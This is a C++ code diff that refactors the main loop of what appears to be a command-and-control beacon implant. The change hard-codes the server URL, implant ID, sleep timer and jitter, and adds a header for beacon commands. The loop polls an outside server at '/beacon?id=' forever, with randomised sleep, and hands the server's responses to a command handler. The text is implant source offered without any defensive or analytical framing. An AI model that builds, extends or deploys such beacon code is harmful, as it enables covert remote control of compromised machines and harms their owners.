@@ -22,10 +22,11 @@
 #include <windows.h>
 #define OS "Windows"
 #include "../Windows/generic.h"
+#include "../Windows/Beacon/beacon_commands.h"
 #endif
 
 
-std::string constructUrl(const std::string& address, const std::string& ID) {
+std::string constructUrl() {
     return URL + "/beacon?id=" + ID;
 }
 
@@ -225,13 +226,13 @@ bool handleResponse(const std::string& response_body, int& timer, const std::str
 
 
 
-int beacon(const std::string& address, const std::string& ID, int jitter, int timer) {
+int beacon() {
     srand(time(0));
     while (true) {
-        std::string beaconURL = constructUrl(address, ID);
+        std::string beaconURL = constructUrl();
         std::cout << "Request URL: " << beaconURL << std::endl;
 
-        int sleepTime = calculateSleepTime(timer, jitter);
+        int sleepTime = calculateSleepTime(TIMER, JITTER);
 
         auto [response_code, response_body, response_url] = getRequest(beaconURL);
         if (response_code == -1) {
@@ -242,7 +243,7 @@ int beacon(const std::string& address, const std::string& ID, int jitter, int ti
         } else {
             try {
                 if (response_code == 200) {
-                    if (handleResponse(response_body, timer, ID)) {
+                    if (handleResponse(response_body, TIMER, ID)) {
                         continue;
                     }
                 }
